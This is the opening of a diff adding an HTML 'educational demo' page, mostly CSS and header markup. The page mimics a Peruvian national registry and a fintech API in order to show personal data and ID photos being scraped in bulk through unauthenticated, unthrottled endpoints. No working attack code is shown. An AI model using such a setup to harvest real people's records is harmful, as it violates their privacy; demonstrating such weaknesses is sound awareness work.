@@ -1,0 +1,1899 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sistema de Consulta Interinstitucional</title>
+<!-- Fully offline — no external requests -->
+<style>
+  /* System font stacks that look great without internet */
+  :root {
+    --font-serif: Georgia, 'Times New Roman', serif;
+    --font-sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+    --font-mono: 'SF Mono', 'Menlo', 'Consolas', 'Liberation Mono', monospace;
+    --font-display: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Helvetica, sans-serif;
+  }
+</style>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  /* Government palette */
+  --gov-navy: #1a2744;
+  --gov-navy-dark: #0f1a2e;
+  --gov-blue: #1e3a5f;
+  --gov-blue-light: #2a4a73;
+  --gov-gold: #c9a84c;
+  --gov-gold-light: #d4bc72;
+  --gov-gold-dark: #a8893d;
+  --gov-red: #8b1a1a;
+  --gov-cream: #faf8f3;
+  --gov-gray: #e8e6e1;
+  --gov-text: #2c2c2c;
+  --gov-text-light: #5a5a5a;
+  --gov-border: #d1cfc9;
+
+  /* Fintech palette */
+  --fin-green: #059669;
+  --fin-green-light: #10b981;
+  --fin-green-dark: #047857;
+  --fin-emerald-bg: #ecfdf5;
+  --fin-dark: #064e3b;
+  --fin-gray: #f0fdf4;
+  --fin-text: #1a1a2e;
+}
+
+html { font-size: 15px; }
+body {
+  font-family: var(--font-sans);
+  color: var(--gov-text);
+  background: #f5f4f0;
+  min-height: 100vh;
+  -webkit-font-smoothing: antialiased;
+}
+
+/* ========== GOVERNMENT HEADER ========== */
+.gov-topbar {
+  background: var(--gov-navy-dark);
+  padding: 4px 0;
+  font-size: 0.72rem;
+  color: rgba(255,255,255,0.5);
+  letter-spacing: 0.03em;
+  border-bottom: 1px solid rgba(255,255,255,0.08);
+}
+.gov-topbar-inner {
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 0 24px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.gov-topbar a {
+  color: rgba(255,255,255,0.5);
+  text-decoration: none;
+  font-size: 0.7rem;
+}
+
+.gov-header {
+  background: linear-gradient(180deg, var(--gov-navy) 0%, var(--gov-blue) 100%);
+  padding: 0;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.25);
+  position: relative;
+}
+.gov-header::after {
+  content: '';
+  position: absolute;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  height: 3px;
+  background: linear-gradient(90deg, var(--gov-gold-dark), var(--gov-gold), var(--gov-gold-dark));
+}
+
+.gov-header-inner {
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 16px 24px;
+  display: flex;
+  align-items: center;
+  gap: 18px;
+}
+
+.gov-shield {
+  width: 56px;
+  height: 64px;
+  flex-shrink: 0;
+}
+
+.gov-title-block h1 {
+  font-family: var(--font-serif);
+  font-size: 1.15rem;
+  font-weight: 700;
+  color: #ffffff;
+  letter-spacing: 0.01em;
+  line-height: 1.3;
+}
+.gov-title-block h1 span {
+  color: var(--gov-gold);
+}
+.gov-title-block p {
+  font-size: 0.78rem;
+  color: rgba(255,255,255,0.55);
+  margin-top: 2px;
+  letter-spacing: 0.04em;
+  text-transform: uppercase;
+  font-weight: 300;
+}
+
+/* ========== FINTECH HEADER ========== */
+.fin-header {
+  background: #ffffff;
+  padding: 0;
+  box-shadow: 0 1px 8px rgba(0,0,0,0.06);
+  border-bottom: 2px solid var(--fin-green);
+  display: none;
+}
+.fin-header-inner {
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 14px 24px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.fin-logo {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-family: var(--font-display);
+  font-weight: 800;
+  font-size: 1.5rem;
+  color: var(--fin-dark);
+}
+.fin-logo-icon {
+  width: 36px;
+  height: 36px;
+  background: linear-gradient(135deg, var(--fin-green) 0%, var(--fin-green-light) 100%);
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.fin-logo-icon svg { width: 20px; height: 20px; }
+.fin-badge {
+  font-size: 0.65rem;
+  background: var(--fin-emerald-bg);
+  color: var(--fin-green);
+  padding: 3px 8px;
+  border-radius: 99px;
+  font-weight: 600;
+  letter-spacing: 0.03em;
+}
+
+/* ========== NAV TABS ========== */
+.nav-tabs {
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 0 24px;
+  display: flex;
+  gap: 0;
+  background: transparent;
+}
+.nav-tab {
+  padding: 11px 22px;
+  font-size: 0.82rem;
+  font-weight: 600;
+  color: rgba(255,255,255,0.55);
+  border: none;
+  background: transparent;
+  cursor: pointer;
+  position: relative;
+  transition: color 0.2s;
+  font-family: inherit;
+  letter-spacing: 0.02em;
+}
+.nav-tab:hover { color: rgba(255,255,255,0.85); }
+.nav-tab.active {
+  color: var(--gov-gold);
+}
+.nav-tab.active::after {
+  content: '';
+  position: absolute;
+  bottom: 0;
+  left: 12px;
+  right: 12px;
+  height: 3px;
+  background: var(--gov-gold);
+  border-radius: 3px 3px 0 0;
+}
+
+/* Fintech nav style override */
+.fin-nav .nav-tab {
+  color: #6b7280;
+}
+.fin-nav .nav-tab:hover { color: #1f2937; }
+.fin-nav .nav-tab.active {
+  color: var(--fin-green);
+}
+.fin-nav .nav-tab.active::after {
+  background: var(--fin-green);
+}
+
+/* ========== MAIN CONTENT ========== */
+.main-content {
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 28px 24px 60px;
+}
+
+.section { display: none; }
+.section.active { display: block; }
+
+/* ========== SECTION 1: CONSULTA ========== */
+.search-panel {
+  background: #ffffff;
+  border: 1px solid var(--gov-border);
+  border-radius: 4px;
+  padding: 28px 32px;
+  box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+}
+.search-panel h2 {
+  font-family: var(--font-serif);
+  font-size: 1.05rem;
+  font-weight: 700;
+  color: var(--gov-blue);
+  margin-bottom: 4px;
+}
+.search-panel .subtitle {
+  font-size: 0.8rem;
+  color: var(--gov-text-light);
+  margin-bottom: 20px;
+}
+.search-row {
+  display: flex;
+  gap: 12px;
+  align-items: flex-end;
+}
+.search-field {
+  flex: 1;
+}
+.search-field label {
+  display: block;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--gov-text-light);
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  margin-bottom: 6px;
+}
+.search-field input {
+  width: 100%;
+  padding: 10px 14px;
+  border: 1px solid var(--gov-border);
+  border-radius: 3px;
+  font-size: 1rem;
+  font-family: var(--font-mono);
+  letter-spacing: 0.08em;
+  color: var(--gov-text);
+  background: #fafaf8;
+  transition: border-color 0.2s;
+}
+.search-field input:focus {
+  outline: none;
+  border-color: var(--gov-blue);
+  box-shadow: 0 0 0 2px rgba(30,58,95,0.1);
+}
+.search-field input::placeholder {
+  color: #b0ada6;
+  font-family: var(--font-sans);
+  letter-spacing: 0;
+}
+
+.btn-gov {
+  padding: 10px 28px;
+  background: var(--gov-blue);
+  color: #fff;
+  border: none;
+  border-radius: 3px;
+  font-size: 0.85rem;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background 0.15s;
+  font-family: inherit;
+  white-space: nowrap;
+}
+.btn-gov:hover { background: var(--gov-blue-light); }
+.btn-gov:active { background: var(--gov-navy); }
+
+.result-card {
+  background: #ffffff;
+  border: 1px solid var(--gov-border);
+  border-radius: 4px;
+  margin-top: 20px;
+  overflow: hidden;
+  box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+  display: none;
+}
+.result-card.visible { display: block; animation: fadeSlide 0.3s ease; }
+
+@keyframes fadeSlide {
+  from { opacity: 0; transform: translateY(8px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.result-header {
+  background: var(--gov-cream);
+  padding: 14px 24px;
+  border-bottom: 1px solid var(--gov-border);
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.result-header h3 {
+  font-family: var(--font-serif);
+  font-size: 0.88rem;
+  color: var(--gov-blue);
+}
+.result-header .badge {
+  font-size: 0.65rem;
+  background: var(--gov-blue);
+  color: var(--gov-gold);
+  padding: 3px 10px;
+  border-radius: 2px;
+  font-weight: 600;
+  letter-spacing: 0.05em;
+  text-transform: uppercase;
+}
+.result-body {
+  padding: 20px 24px;
+}
+.result-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 14px 32px;
+}
+.result-field label {
+  display: block;
+  font-size: 0.68rem;
+  font-weight: 600;
+  color: var(--gov-text-light);
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  margin-bottom: 2px;
+}
+.result-field .value {
+  font-size: 0.95rem;
+  color: var(--gov-text);
+  font-weight: 400;
+}
+.result-field .value.mono {
+  font-family: var(--font-mono);
+  font-size: 0.88rem;
+  letter-spacing: 0.04em;
+}
+.result-field.full-width {
+  grid-column: 1 / -1;
+}
+.result-raw {
+  margin-top: 16px;
+  padding-top: 16px;
+  border-top: 1px solid var(--gov-gray);
+}
+.result-raw summary {
+  font-size: 0.72rem;
+  color: var(--gov-text-light);
+  cursor: pointer;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+}
+.result-raw pre {
+  margin-top: 10px;
+  background: var(--gov-navy-dark);
+  color: #a4e4b0;
+  padding: 16px;
+  border-radius: 4px;
+  font-family: var(--font-mono);
+  font-size: 0.78rem;
+  line-height: 1.6;
+  overflow-x: auto;
+  white-space: pre-wrap;
+}
+
+.error-msg {
+  margin-top: 16px;
+  padding: 12px 18px;
+  background: #fef2f2;
+  border: 1px solid #fecaca;
+  border-radius: 4px;
+  color: #991b1b;
+  font-size: 0.85rem;
+  display: none;
+}
+.error-msg.visible { display: block; animation: fadeSlide 0.2s ease; }
+
+/* ========== SECTION 2: FOTO ========== */
+.foto-search-panel {
+  background: #ffffff;
+  border: 1px solid var(--gov-border);
+  border-radius: 4px;
+  padding: 28px 32px;
+  box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+}
+.foto-search-panel h2 {
+  font-family: var(--font-serif);
+  font-size: 1.05rem;
+  font-weight: 700;
+  color: var(--gov-blue);
+  margin-bottom: 4px;
+}
+
+.b64-helper {
+  margin-top: 12px;
+  padding: 12px 16px;
+  background: #fffbeb;
+  border: 1px solid #fde68a;
+  border-radius: 4px;
+  font-size: 0.8rem;
+  color: #92400e;
+  display: none;
+}
+.b64-helper.visible { display: block; }
+.b64-helper code {
+  font-family: var(--font-mono);
+  background: rgba(0,0,0,0.06);
+  padding: 1px 6px;
+  border-radius: 2px;
+  font-size: 0.78rem;
+}
+
+.foto-result {
+  margin-top: 20px;
+  display: none;
+}
+.foto-result.visible { display: block; animation: fadeSlide 0.3s ease; }
+
+.foto-card {
+  background: #ffffff;
+  border: 1px solid var(--gov-border);
+  border-radius: 4px;
+  overflow: hidden;
+  display: flex;
+  gap: 0;
+  box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+}
+.foto-card-img {
+  width: 220px;
+  min-height: 280px;
+  background: #f1f5f9;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-right: 1px solid var(--gov-border);
+  flex-shrink: 0;
+  position: relative;
+}
+.foto-card-img img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+.foto-card-img .watermark {
+  position: absolute;
+  bottom: 8px;
+  right: 8px;
+  font-size: 0.55rem;
+  color: rgba(0,0,0,0.25);
+  font-family: var(--font-mono);
+  letter-spacing: 0.02em;
+}
+.foto-card-info {
+  padding: 24px 28px;
+  flex: 1;
+}
+.foto-card-info h3 {
+  font-family: var(--font-serif);
+  font-size: 1.1rem;
+  color: var(--gov-blue);
+  margin-bottom: 16px;
+}
+.foto-meta-row {
+  display: flex;
+  justify-content: space-between;
+  padding: 8px 0;
+  border-bottom: 1px solid var(--gov-gray);
+  font-size: 0.85rem;
+}
+.foto-meta-row:last-child { border-bottom: none; }
+.foto-meta-row .label { color: var(--gov-text-light); font-weight: 600; font-size: 0.78rem; text-transform: uppercase; letter-spacing: 0.04em; }
+.foto-meta-row .val { font-family: var(--font-mono); font-size: 0.82rem; }
+
+.gallery-controls {
+  margin-top: 20px;
+  display: flex;
+  gap: 12px;
+  align-items: center;
+}
+.btn-gallery {
+  padding: 10px 22px;
+  background: var(--gov-red);
+  color: #fff;
+  border: none;
+  border-radius: 3px;
+  font-size: 0.82rem;
+  font-weight: 600;
+  cursor: pointer;
+  font-family: inherit;
+  transition: background 0.15s;
+}
+.btn-gallery:hover { background: #a02020; }
+.gallery-status {
+  font-size: 0.78rem;
+  color: var(--gov-text-light);
+}
+
+.foto-gallery {
+  margin-top: 20px;
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+  gap: 12px;
+}
+.gallery-item {
+  background: #fff;
+  border: 1px solid var(--gov-border);
+  border-radius: 4px;
+  overflow: hidden;
+  animation: fadeSlide 0.3s ease;
+  box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+}
+.gallery-item img {
+  width: 100%;
+  aspect-ratio: 3/4;
+  object-fit: cover;
+  display: block;
+}
+.gallery-item-info {
+  padding: 8px 10px;
+  font-size: 0.72rem;
+}
+.gallery-item-info .name {
+  font-weight: 600;
+  color: var(--gov-text);
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.gallery-item-info .dni-num {
+  font-family: var(--font-mono);
+  color: var(--gov-text-light);
+  font-size: 0.68rem;
+}
+
+/* ========== SECTION 3: PAGAFACIL ========== */
+.section-pagafacil {
+  font-family: var(--font-display);
+}
+
+.fin-panel {
+  background: #ffffff;
+  border: 1px solid #e5e7eb;
+  border-radius: 12px;
+  padding: 32px;
+  box-shadow: 0 1px 6px rgba(0,0,0,0.04);
+}
+.fin-panel h2 {
+  font-family: var(--font-display);
+  font-size: 1.15rem;
+  font-weight: 700;
+  color: var(--fin-text);
+  margin-bottom: 4px;
+}
+.fin-panel .subtitle {
+  font-size: 0.8rem;
+  color: #6b7280;
+  margin-bottom: 24px;
+}
+
+.fin-form-row {
+  display: flex;
+  gap: 16px;
+  align-items: flex-end;
+}
+.fin-field {
+  flex: 1;
+}
+.fin-field label {
+  display: block;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: #374151;
+  margin-bottom: 6px;
+}
+.fin-field input {
+  width: 100%;
+  padding: 10px 14px;
+  border: 1.5px solid #d1d5db;
+  border-radius: 8px;
+  font-size: 0.95rem;
+  font-family: var(--font-mono);
+  color: var(--fin-text);
+  background: #fafafa;
+  transition: all 0.15s;
+}
+.fin-field input:focus {
+  outline: none;
+  border-color: var(--fin-green);
+  box-shadow: 0 0 0 3px rgba(16,185,129,0.12);
+}
+
+.btn-fin {
+  padding: 10px 28px;
+  background: linear-gradient(135deg, var(--fin-green) 0%, var(--fin-green-light) 100%);
+  color: #fff;
+  border: none;
+  border-radius: 8px;
+  font-size: 0.85rem;
+  font-weight: 700;
+  cursor: pointer;
+  font-family: var(--font-display);
+  transition: all 0.15s;
+  white-space: nowrap;
+}
+.btn-fin:hover {
+  box-shadow: 0 4px 12px rgba(5,150,105,0.3);
+  transform: translateY(-1px);
+}
+
+.token-display {
+  margin-top: 20px;
+  padding: 16px 20px;
+  background: #f0fdf4;
+  border: 1px solid #bbf7d0;
+  border-radius: 8px;
+  display: none;
+}
+.token-display.visible { display: block; animation: fadeSlide 0.3s ease; }
+.token-label {
+  font-size: 0.7rem;
+  font-weight: 700;
+  color: var(--fin-green-dark);
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  margin-bottom: 6px;
+}
+.token-value {
+  font-family: var(--font-mono);
+  font-size: 0.72rem;
+  color: var(--fin-dark);
+  word-break: break-all;
+  line-height: 1.5;
+  background: rgba(255,255,255,0.6);
+  padding: 8px 12px;
+  border-radius: 4px;
+  border: 1px solid #d1fae5;
+}
+.token-meta {
+  margin-top: 8px;
+  font-size: 0.72rem;
+  color: #6b7280;
+}
+.token-meta span {
+  color: var(--fin-green);
+  font-weight: 600;
+}
+
+.txn-panel {
+  margin-top: 24px;
+  background: #ffffff;
+  border: 1px solid #e5e7eb;
+  border-radius: 12px;
+  overflow: hidden;
+  box-shadow: 0 1px 6px rgba(0,0,0,0.04);
+  display: none;
+}
+.txn-panel.visible { display: block; animation: fadeSlide 0.3s ease; }
+
+.txn-header {
+  padding: 16px 24px;
+  background: #f9fafb;
+  border-bottom: 1px solid #e5e7eb;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.txn-header h3 {
+  font-family: var(--font-display);
+  font-size: 0.95rem;
+  font-weight: 700;
+  color: var(--fin-text);
+}
+.txn-count {
+  font-size: 0.75rem;
+  background: var(--fin-emerald-bg);
+  color: var(--fin-green);
+  padding: 3px 10px;
+  border-radius: 99px;
+  font-weight: 600;
+}
+
+.txn-table {
+  width: 100%;
+  border-collapse: collapse;
+}
+.txn-table th {
+  text-align: left;
+  padding: 10px 16px;
+  font-size: 0.7rem;
+  font-weight: 700;
+  color: #6b7280;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  background: #f9fafb;
+  border-bottom: 1px solid #e5e7eb;
+}
+.txn-table td {
+  padding: 12px 16px;
+  font-size: 0.82rem;
+  border-bottom: 1px solid #f3f4f6;
+  vertical-align: top;
+}
+.txn-table tr:hover { background: #fafafa; }
+.txn-table tr.expanded { background: #f0fdf4; }
+
+.txn-amount {
+  font-family: var(--font-mono);
+  font-weight: 500;
+  font-size: 0.85rem;
+}
+.txn-status {
+  display: inline-block;
+  padding: 2px 8px;
+  border-radius: 99px;
+  font-size: 0.68rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
+}
+.txn-status.approved { background: #d1fae5; color: #065f46; }
+.txn-status.declined { background: #fee2e2; color: #991b1b; }
+
+.txn-card-info {
+  font-family: var(--font-mono);
+  font-size: 0.75rem;
+  color: #6b7280;
+}
+
+.txn-expand {
+  cursor: pointer;
+  color: var(--fin-green);
+  font-size: 0.75rem;
+  font-weight: 600;
+  border: none;
+  background: none;
+  font-family: inherit;
+}
+.txn-expand:hover { text-decoration: underline; }
+
+.txn-details {
+  display: none;
+  padding: 12px 16px 12px 16px;
+  background: #f0fdf4;
+  border-bottom: 1px solid #d1fae5;
+}
+.txn-details.visible { display: table-row; }
+.txn-details td {
+  padding: 12px 16px;
+}
+.txn-detail-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr 1fr;
+  gap: 10px;
+}
+.txn-detail-item label {
+  display: block;
+  font-size: 0.65rem;
+  font-weight: 700;
+  color: #6b7280;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  margin-bottom: 2px;
+}
+.txn-detail-item .val {
+  font-size: 0.82rem;
+  color: var(--fin-text);
+}
+.txn-detail-item .val.sensitive {
+  color: #dc2626;
+  font-weight: 600;
+}
+
+/* ========== FOOTER ========== */
+.gov-footer {
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 16px 24px;
+  text-align: center;
+  font-size: 0.68rem;
+  color: #9ca3af;
+  border-top: 1px solid var(--gov-border);
+}
+.gov-footer .version {
+  font-family: var(--font-mono);
+  font-size: 0.62rem;
+}
+
+/* ========== UTILITIES ========== */
+.hidden { display: none !important; }
+
+/* Demo watermark — very subtle */
+/* Quick-fill chips for live demo */
+.quick-fills {
+  display: flex;
+  gap: 6px;
+  margin-top: 10px;
+  flex-wrap: wrap;
+  align-items: center;
+}
+.quick-fills .qf-label {
+  font-size: 0.65rem;
+  color: #9ca3af;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  font-weight: 600;
+  margin-right: 4px;
+}
+.qf-chip {
+  padding: 4px 12px;
+  border: 1px solid #d1d5db;
+  border-radius: 99px;
+  font-size: 0.72rem;
+  font-family: var(--font-mono);
+  background: #fafafa;
+  cursor: pointer;
+  transition: all 0.15s;
+  color: #374151;
+}
+.qf-chip:hover {
+  background: #e0e7ff;
+  border-color: #818cf8;
+  color: #3730a3;
+}
+.qf-chip.fin {
+  border-color: #a7f3d0;
+}
+.qf-chip.fin:hover {
+  background: #d1fae5;
+  border-color: #34d399;
+  color: #065f46;
+}
+
+/* Network inspector panel */
+.net-inspector {
+  margin-top: 20px;
+  border: 2px solid #1e293b;
+  border-radius: 6px;
+  overflow: hidden;
+  display: none;
+  animation: fadeSlide 0.3s ease;
+}
+.net-inspector.visible { display: block; }
+.net-inspector-bar {
+  background: #1e293b;
+  padding: 8px 14px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-family: var(--font-mono);
+  font-size: 0.7rem;
+  color: #94a3b8;
+}
+.net-inspector-bar .tab-active {
+  color: #60a5fa;
+  border-bottom: 2px solid #60a5fa;
+  padding-bottom: 2px;
+}
+.net-inspector-bar .tab-inactive {
+  opacity: 0.4;
+}
+.net-inspector-bar .dot { width:8px; height:8px; border-radius:50%; }
+.net-inspector-bar .dot-red { background:#ef4444; }
+.net-inspector-bar .dot-yellow { background:#eab308; }
+.net-inspector-bar .dot-green { background:#22c55e; }
+.net-inspector-content {
+  background: #0f172a;
+  padding: 0;
+  max-height: 320px;
+  overflow-y: auto;
+}
+.net-req {
+  padding: 10px 16px;
+  border-bottom: 1px solid #1e293b;
+  font-family: var(--font-mono);
+  font-size: 0.75rem;
+  line-height: 1.7;
+  cursor: pointer;
+  transition: background 0.1s;
+}
+.net-req:hover { background: #1e293b; }
+.net-req .method {
+  color: #22c55e;
+  font-weight: 700;
+}
+.net-req .url {
+  color: #e2e8f0;
+}
+.net-req .status-ok {
+  color: #22c55e;
+}
+.net-req .status-badge {
+  display: inline-block;
+  padding: 1px 6px;
+  border-radius: 3px;
+  font-size: 0.65rem;
+  font-weight: 700;
+}
+.net-req .status-badge.ok { background: rgba(34,197,94,0.15); color: #22c55e; }
+.net-req .no-auth {
+  color: #ef4444;
+  font-weight: 700;
+}
+.net-req .time {
+  color: #64748b;
+  font-size: 0.68rem;
+}
+.net-req .header-line {
+  color: #64748b;
+  padding-left: 20px;
+}
+.net-req .header-key { color: #94a3b8; }
+.net-req .header-val { color: #fbbf24; }
+.net-req .response-preview {
+  margin-top: 6px;
+  padding: 8px 12px;
+  background: #1a1a2e;
+  border-radius: 4px;
+  color: #a3e635;
+  font-size: 0.72rem;
+  white-space: pre-wrap;
+  max-height: 120px;
+  overflow-y: auto;
+}
+.net-reveal-btn {
+  margin-top: 12px;
+  padding: 8px 18px;
+  background: none;
+  border: 1px dashed #64748b;
+  border-radius: 4px;
+  color: #64748b;
+  font-size: 0.75rem;
+  font-family: var(--font-mono);
+  cursor: pointer;
+  transition: all 0.15s;
+}
+.net-reveal-btn:hover {
+  border-color: #ef4444;
+  color: #ef4444;
+  background: rgba(239,68,68,0.05);
+}
+.net-curl {
+  margin-top: 12px;
+  padding: 14px 16px;
+  background: #0f172a;
+  border: 1px solid #1e293b;
+  border-radius: 6px;
+  font-family: var(--font-mono);
+  font-size: 0.78rem;
+  color: #e2e8f0;
+  line-height: 1.6;
+  display: none;
+}
+.net-curl.visible { display: block; animation: fadeSlide 0.2s ease; }
+.net-curl .comment { color: #64748b; }
+.net-curl .cmd { color: #22c55e; }
+.net-curl .url-highlight { color: #fbbf24; }
+
+/* Request counter widget */
+.req-counter {
+  position: fixed;
+  top: 12px;
+  right: 16px;
+  background: rgba(15, 23, 42, 0.92);
+  color: #f1f5f9;
+  padding: 10px 16px;
+  border-radius: 8px;
+  font-family: var(--font-mono);
+  font-size: 0.78rem;
+  z-index: 1000;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+  backdrop-filter: blur(8px);
+  transition: opacity 0.3s;
+}
+.req-counter.hidden { opacity: 0; pointer-events: none; }
+.req-counter .counter-num {
+  font-size: 1.4rem;
+  font-weight: 700;
+  color: #f87171;
+  min-width: 36px;
+  text-align: right;
+}
+.req-counter .counter-label {
+  font-size: 0.65rem;
+  color: #94a3b8;
+  line-height: 1.3;
+}
+.req-counter .counter-label span {
+  color: #fbbf24;
+  font-weight: 600;
+}
+.req-counter .counter-dot {
+  width: 8px;
+  height: 8px;
+  background: #f87171;
+  border-radius: 50%;
+  animation: pulse-dot 1s infinite;
+}
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+
+/* ========== BASE64 STEP VISUALIZATION ========== */
+.b64-step {
+  margin-top: 20px;
+  padding: 16px 20px;
+  border: 1px solid var(--gov-border);
+  border-radius: 4px;
+  background: #fff;
+}
+.b64-step-derived {
+  border-left: 3px solid var(--gov-gold);
+  background: #fffdf5;
+  animation: fadeSlide 0.4s ease;
+}
+.b64-step-label {
+  font-size: 0.72rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  color: var(--gov-text-light);
+  margin-bottom: 10px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.b64-step-num {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 20px;
+  height: 20px;
+  background: var(--gov-blue);
+  color: white;
+  border-radius: 50%;
+  font-size: 0.7rem;
+  font-weight: 700;
+  flex-shrink: 0;
+}
+.b64-not-enc {
+  color: #b91c1c;
+  font-weight: 600;
+  text-transform: none;
+  letter-spacing: 0;
+  font-size: 0.7rem;
+}
+.b64-transform {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  font-family: var(--font-mono);
+  font-size: 1rem;
+}
+.b64-from {
+  background: #e0e7ff;
+  color: #1e3a8a;
+  padding: 6px 14px;
+  border-radius: 4px;
+  font-weight: 700;
+  font-size: 1.1rem;
+  letter-spacing: 0.06em;
+}
+.b64-arrow {
+  font-size: 1.4rem;
+  color: var(--gov-gold-dark);
+  font-weight: 700;
+}
+.b64-to {
+  background: #fef3c7;
+  color: #92400e;
+  padding: 6px 14px;
+  border-radius: 4px;
+  font-weight: 700;
+  font-size: 1.1rem;
+  letter-spacing: 0.04em;
+  word-break: break-all;
+}
+.b64-url {
+  font-family: var(--font-mono);
+  font-size: 0.82rem;
+  color: var(--gov-navy);
+  background: var(--gov-navy-dark);
+  color: #a4e4b0;
+  padding: 10px 14px;
+  border-radius: 4px;
+  word-break: break-all;
+  line-height: 1.6;
+}
+
+.demo-watermark {
+  position: fixed;
+  bottom: 8px;
+  right: 12px;
+  font-size: 0.58rem;
+  color: rgba(0,0,0,0.08);
+  font-family: var(--font-mono);
+  pointer-events: none;
+  z-index: 999;
+}
+</style>
+</head>
+<body>
+
+<div class="demo-watermark">DEMO EDUCATIVO — DATOS FICTICIOS</div>
+
+<!-- Education banner -->
+<div style="position:fixed;bottom:0;left:0;right:0;background:#1e3a5f;color:rgba(255,255,255,0.85);text-align:center;font-size:0.7rem;padding:5px 16px;font-family:var(--font-mono);letter-spacing:0.05em;z-index:9999;border-top:2px solid #c9a84c;">
+  DEMO EDUCATIVO — Esta aplicación y sus datos son completamente ficticios. Ningún sistema real fue accedido.
+</div>
+
+<!-- Live request counter -->
+<div class="req-counter hidden" id="req-counter">
+  <div class="counter-dot"></div>
+  <div class="counter-num" id="counter-num">0</div>
+  <div class="counter-label">
+    consultas en <span id="counter-time">0s</span><br>
+    <span>sin limite de velocidad</span>
+  </div>
+</div>
+
+<!-- ====== GOVERNMENT HEADER (Acts 1 & 2) ====== -->
+<div id="gov-chrome">
+  <div class="gov-topbar">
+    <div class="gov-topbar-inner">
+      <span>Portal del Estado Peruano</span>
+      <a href="#">Plataforma Digital Unica</a>
+    </div>
+  </div>
+  <header class="gov-header">
+    <div class="gov-header-inner">
+      <svg class="gov-shield" viewBox="0 0 56 64" fill="none">
+        <path d="M28 2L4 14v20c0 16 24 26 24 26s24-10 24-26V14L28 2z" fill="#1e3a5f" stroke="#c9a84c" stroke-width="2"/>
+        <path d="M28 10L12 18v14c0 11 16 18 16 18s16-7 16-18V18L28 10z" fill="#0f1a2e"/>
+        <text x="28" y="40" font-family="Georgia,serif" font-size="16" font-weight="900" fill="#c9a84c" text-anchor="middle">RN</text>
+        <path d="M18 48h20" stroke="#c9a84c" stroke-width="1" opacity="0.5"/>
+      </svg>
+      <div class="gov-title-block">
+        <h1><span>Registro Nacional</span> — Sistema de Consulta</h1>
+        <p>Plataforma Interinstitucional de Acceso a Datos</p>
+      </div>
+    </div>
+    <nav class="nav-tabs" id="gov-nav">
+      <button class="nav-tab active" data-section="consulta" onclick="switchSection('consulta')">Hackathon ONPE</button>
+      <button class="nav-tab" data-section="foto" onclick="switchSection('foto')">Consulta de Foto</button>
+      <button class="nav-tab" data-section="pagafacil" onclick="switchSection('pagafacil')">PagaFacil</button>
+    </nav>
+  </header>
+</div>
+
+<!-- ====== FINTECH HEADER (Act 3) ====== -->
+<div id="fin-chrome" style="display:none;">
+  <header class="fin-header" style="display:block;">
+    <div class="fin-header-inner">
+      <div class="fin-logo">
+        <div class="fin-logo-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="1" y="4" width="22" height="16" rx="3"/>
+            <line x1="1" y1="10" x2="23" y2="10"/>
+          </svg>
+        </div>
+        PagaFacil
+      </div>
+      <div style="display:flex;align-items:center;gap:16px;">
+        <span class="fin-badge">API v3.2</span>
+        <nav class="nav-tabs fin-nav" id="fin-nav">
+          <button class="nav-tab" data-section="consulta" onclick="switchSection('consulta')">Registro Nacional</button>
+          <button class="nav-tab" data-section="foto" onclick="switchSection('foto')">Consulta de Foto</button>
+          <button class="nav-tab active" data-section="pagafacil" onclick="switchSection('pagafacil')">PagaFacil</button>
+        </nav>
+      </div>
+    </div>
+  </header>
+</div>
+
